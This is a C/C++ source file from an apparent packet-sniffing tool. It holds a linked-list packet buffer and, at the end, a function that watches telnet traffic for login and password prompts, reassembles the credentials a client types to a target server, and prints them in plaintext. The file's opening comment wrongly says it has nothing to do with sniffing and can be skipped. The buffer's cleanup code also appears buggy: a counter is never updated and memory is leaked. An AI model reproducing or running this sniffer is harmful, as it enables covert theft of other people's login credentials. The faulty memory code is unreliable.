#include <buffer.h>
/* this file has nothing to do with pcap and sniffing so you can skip reading this
 * so not a lot of comments here, most things are straight forward. this basically
 * implements a very simple memory buffer to store all the packets we collect.
 */

/* do some sanity checks and initialize the buffer */
extern struct sockaddr_in server;
int create_buffer(buffer* buf, long long int capacity, long long garbage)
{

  if(buf == NULL) return -1;
  
  buf->items=0;
  buf->garbage_size= (garbage<=0)?GARBAGE_SIZE:garbage;
  buf->capacity= (capacity<=0)?DEFAULT_CAPACITY:capacity;
  buf->header=NULL;
  buf->tail=NULL;

  return 0; 
}

/* append the packet to the buffer avoid sanity checks, we want to be done quickly here */
int append_item(buffer* buf, const struct pcap_pkthdr* packet_header, const u_char* full_packet){

  item* tmp;

#ifdef DEBUG
  /* if already full run garbage collector and see */
  if(buf->items >= buf->capacity){
    gc(buf);
    if(buf->items >= buf->capacity)
      return -1;
  }
#endif

  /* first item */
  if(buf->items==0){
    /* allocate space for new item */
    if((tmp= (item *)malloc(sizeof(item)))==NULL){
      fprintf(stderr, "could not allocate memory for an item\n");
      exit(-1);
    }

    /* allocate space for packet header and set it */
    if((tmp->packet_header= (struct pcap_pkthdr *) malloc(sizeof(struct pcap_pkthdr)))==NULL){
      fprintf(stderr, "could not allocate memory for packet header\n");
      exit(-1); 
    }
    memcpy(tmp->packet_header, packet_header, sizeof(struct pcap_pkthdr));

    /* allocate space for full packet and set it */
    if((tmp->full_packet= (u_char *)malloc((packet_header->caplen)))==NULL){
      fprintf(stderr, "could not allocate memory for full packet\n");
      exit(-1);
    }
    memcpy(tmp->full_packet, full_packet, packet_header->caplen);
  
    tmp->garbage=0;
    tmp->next=NULL;
    tmp->prev=NULL;

    /* set header etc. properly */
    buf->header= tmp;
    buf->tail= tmp;
    buf->items++;
  }else{
    /* has one or more items */
    if((tmp= (item *)malloc(sizeof(item)))==NULL){
      fprintf(stderr, "could not allocate memory for an item\n");
      exit(-1);
    }

    /* allocate space for packet header */
    if((tmp->packet_header= (struct pcap_pkthdr *) malloc(sizeof(struct pcap_pkthdr)))==NULL){
      fprintf(stderr, "could not allocate memory for packet header\n");
      exit(-1);
    }
    memcpy(tmp->packet_header, packet_header, sizeof(struct pcap_pkthdr));

    /* allocate space for full packet */
    if((tmp->full_packet= (u_char *)malloc(packet_header->caplen))==NULL){
      fprintf(stderr, "could not allocate memory for full packet\n");
      exit(-1);
    }
    memcpy(tmp->full_packet, full_packet, packet_header->caplen);

    tmp->garbage=0;

    /* set header etc. properly */
    /* for the new node, next is current header
     * prev is NULL
     */
    tmp->next= buf->header;
    tmp->prev= NULL;

    /* for the current header,
     * prev is new node
     */
    (buf->header)->prev= tmp;

    /* header is new node */
    buf->header= tmp;
    buf->items++;
  }

  /* signal the garbage collector here */
  gc(buf);

#ifdef DEBUG
  fprintf(stderr, ".");
#endif

  return 0;
}

/* a stupid mark and sweep approach */
int gc(buffer* buf){

  item* tail;
  item* tmp;
  long long int i;
  long long int half_i;
  long long int removed=0;

  /* start collection only if more than GARBAGE_SIZE items present in the buffer */
  if(buf->items <= buf->garbage_size) return 0;

  /* sweep half the buffer (minus the first two elements)
   * from tail and delete them if they are ready for collection
   */
  tail= buf->tail;
  half_i= buf->items/2;
  i=0;


  /* do a simple sweep from behind and remove items marked for collection */

  /* case 1: remove all tail items that are marked for deletion 
   * most likely all the items in the back of the buffer are marked
   * for collection, so from tail we expect a long continous list
   * available for collection. let us cycle thru them first
   */
  while((i < half_i) && (tail->garbage)){
    tail= tail->prev;/* move one ahead */
    free(tail->next);/* free the follower */
    tail->next=NULL; /* follower is NULL */

    /* update the items at the end, so that apend
     * doesn't need to wait very often for the lock]
     */
    /* buf->items--;*/ /* one less item */
    ++removed;
    ++i;
  }
  buf->items -= removed;
  
  /* case 2: we would get out of the above loop when either all garbage
   * is collected (i >= half_i) or there was an item found that's not 
   * ready for collection. in this case we may end up removing stuff from
   * the middle of the buffer. so lets do that next.
   */

  /* Houston we have a problem! we are running out of battery power!*/

  removed=0;
  /* get in here only if we need to remove something in the middle */
  while((i < half_i)&&(tail!=NULL)){
    
    /* in the middle */
    if(tail->garbage){
      (tail->prev)->next= tail->next;
      (tail->next)->prev= tail->prev;/* expect a bark for last item */
      tmp= tail;
      tail= tail->prev;
      free(tmp);

      /* update the items at the end so that append doesn't have to
       * wait for lock very often
       */
      /* buf->items--;*/ /* one less item */
      ++i;
    }else{
      tail= tail->prev;
      ++i;
    }
  }
  buf->items-=removed;
  
  return 0;
}

void print(account& x)
{
        std::cout << "user: " << x.user << std::endl << "passwd: " << x.passwd << std::endl;
}

int deal_packet(tnpwbuf* buf, const struct pcap_pkthdr* packet_header, const u_char* full_packet)
{
        //struct ethhdr *eth_hdr;
        struct iphdr *ip_hdr;
        struct tcphdr *tcp_hdr;
        char *telnet_data, *log_data, *passwd_data;
#define LOGIN 7
#define PASSWORD 10
        int len;
        struct sockaddr_in src;
        struct sockaddr_in dst;
        struct in_addr tmp;
        tnpwbuf& bufr = *buf;
        /* */
        if (packet_header->len <= ETH_HSIZE + IP_HSIZE + TCP_HSIZE) return -1;
        //eth_hdr = (struct ethhdr *)full_packet;
        ip_hdr = (struct iphdr *)(full_packet + ETH_HSIZE);
        tcp_hdr = (struct tcphdr *)(full_packet + ETH_HSIZE + (ip_hdr->ihl << 2));
        telnet_data = (char *)(full_packet + ETH_HSIZE + (ip_hdr->ihl << 2) + (tcp_hdr->doff << 2));
        len = packet_header->len - ETH_HSIZE - (ip_hdr->ihl << 2) - (tcp_hdr->doff << 2);
        src.sin_family = AF_INET;
        src.sin_port = tcp_hdr->th_sport;
        src.sin_addr.s_addr = ip_hdr->saddr;
        dst.sin_family = AF_INET;
        dst.sin_port = tcp_hdr->th_dport;
        dst.sin_addr.s_addr = ip_hdr->daddr;

        //if (strcmp(inet_ntoa(src.sin_addr),"172.18.41.14") == 0 || 
        tmp.s_addr = ip_hdr->saddr;
        //if (strcmp(inet_ntoa(tmp), "172.18.41.35") == 0 )
        /*
        {
	fprintf(stdout, "information about this IP packet:\n");
	fprintf(stdout, "length= %d\n", ntohs(ip_hdr->tot_len));
	fprintf(stdout, "header length= %d\n", ip_hdr->ihl );
	fprintf(stdout, "version= %d\n", ip_hdr->version);
	fprintf(stdout, "id= %d\n", ip_hdr->id);
	fprintf(stdout, "offset= %d\n", ip_hdr->frag_off);
	fprintf(stdout, "ttl= %d\n", ip_hdr->ttl);
	fprintf(stdout, "protocol=%d\n", ip_hdr->protocol);
	
	tmp.s_addr= (unsigned long int)ip_hdr->saddr;
        fprintf(stdout, "source= %s\n", inet_ntoa(tmp));
	
	tmp.s_addr= (unsigned long int)ip_hdr->daddr;
	fprintf(stdout, "destination= %s\n", inet_ntoa(tmp));
        printf("sport:%d dport:%d\n", ntohs(tcp_hdr->th_sport), ntohs(tcp_hdr->th_dport));
        log_data = telnet_data + (len - LOGIN);
        printf("telnet:%s\n", telnet_data);
        telnet_data[len] = 0;
        printf("telnet:%s\n\n\n", telnet_data);
        }

        printf("         %u\n", dst.sin_addr.s_addr);
        */

        log_data = telnet_data + (len - LOGIN);
        if (strncmp(log_data, "login: ", LOGIN) == 0)
                bufr[dst].flag = ACCOUNT_RECEIVING;
        passwd_data = telnet_data + len - PASSWORD;
        if (strncmp(passwd_data, "Password: ", PASSWORD) == 0)
                bufr[dst].flag = PASSWORD_RECEIVING;
        if (dst.sin_addr.s_addr == server.sin_addr.s_addr && len > 0)
        {
                switch ( bufr[src].flag)
                {
                        case 0:
                                break;
                        case 1://ACCOUNT_RECEIVING
                                if (strncmp(telnet_data, "\r\n", 2) == 0)
                                {
                                        bufr[src].user += std::string(telnet_data, len - 2);
                                        bufr[src].flag = ACCOUNT_COMPLETED;
                                        break;
                                }
                                if (strncmp(telnet_data, "^C", 2) == 0)
                                {
                                        bufr[src].clear();
                                        break;
                                }
                                if (telnet_data[0] == (char)0xff && telnet_data[1] == (char)0xfd && 
                                                telnet_data[2] == (char)01)
                                        break;
                                bufr[src].user += std::string(telnet_data, len);
                                break;
                        case 2:
                                break;
                        case 3://PASSWORD_RECEIVING
                                if (strncmp(telnet_data, "\r\n", 2) == 0)
                                {
                                        bufr[src].flag = PASSWORD_COMPLETED;
                                        print(bufr[src]);
                                        bufr[src].clear();
                                        break;
                                }
                                bufr[src].passwd += std::string(telnet_data, len);
                        default:
                                break;
                }
        }
        return 0;
}

